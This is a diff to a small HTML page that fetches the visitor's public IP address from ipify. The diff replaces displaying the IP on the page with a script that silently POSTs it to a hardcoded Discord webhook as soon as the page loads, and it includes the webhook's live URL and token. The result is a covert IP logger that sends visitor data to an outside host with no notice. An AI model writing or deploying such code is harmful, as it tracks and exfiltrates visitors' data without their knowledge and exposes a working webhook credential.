@@ -4,21 +4,15 @@
 <script src=
 "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
     </script>
-     
       <script>
     $.getJSON("https://api.ipify.org?format=json", function(data) {
-        $("#gfg").html(data.ip);
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1038215774625603584/5qa1rgmCUJ2GvfGYDJvns6X2xm63Cj2YlshwhjG9F5NLoPYEFx31pB5rWxdlmrwggR7y");
+        request.setRequestHeader('Content-type', 'application/json');
+        request.send(data.ip);
     })
     </script>
    </head>
-   <body onload="sendMessage()">
-    <script>
-    function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1038215774625603584/5qa1rgmCUJ2GvfGYDJvns6X2xm63Cj2YlshwhjG9F5NLoPYEFx31pB5rWxdlmrwggR7y");
-      request.setRequestHeader('Content-type', 'application/json');
-      request.send(data.ip);
-    }
-  </script>
+   <body>
   </body>
  </html> 
